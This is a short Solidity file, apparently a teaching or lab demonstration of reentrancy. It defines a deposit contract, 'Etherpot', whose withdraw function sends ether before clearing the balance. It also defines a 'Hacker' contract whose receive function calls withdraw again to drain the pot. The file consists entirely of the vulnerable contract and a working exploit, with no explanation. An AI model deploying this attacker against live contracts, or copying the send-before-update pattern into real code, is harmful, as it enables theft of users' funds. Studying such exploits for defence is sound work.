    // SPDX-License-Identifier: GPL-3.0
    pragma solidity >=0.7.0 <0.9.0;

    contract Etherpot {

        mapping(address => uint256) balances; 
        constructor() payable{
            
        }

        function addEther() public payable returns (bool) {
            balances[msg.sender]  = balances[msg.sender] + msg.value;
            return true;
        }

        function withdraw() public returns (bool) {
            require(balances[msg.sender] > 0);
            payable(msg.sender).call{value: 1000000000000000000}(""); 
            delete balances[msg.sender]; 
            return true;
        }

        function getBalance() public returns (uint256) {
            return address(this).balance;
        }

    }

    contract Hacker {
        address payable ep;
  
        constructor(address payable ep1) payable {
            ep = ep1;
        }

        function SendEther() public {
            Etherpot(ep).addEther{value: 1000000000000000000}();
        }

        function withdrawEther() public {
             Etherpot(ep).withdraw();
        }

        function getBalance() public view returns (uint256) {
            return address(this).balance;
        }

        receive() payable external {
            Etherpot(ep).withdraw();
        }
    }

    


    

    